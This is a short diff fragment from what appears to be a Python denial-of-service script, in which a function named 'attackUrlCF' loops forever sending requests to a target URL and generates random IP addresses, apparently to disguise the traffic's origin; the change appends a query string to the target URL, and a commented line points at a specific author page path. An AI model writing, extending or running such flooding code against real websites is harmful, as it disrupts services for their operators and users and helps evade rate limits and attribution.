@@ -92,7 +92,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 	while True:
 		try:
-			url = baseUrl
+			url = baseUrl + "?modal=1"
 			# url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,100))
 
 			ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
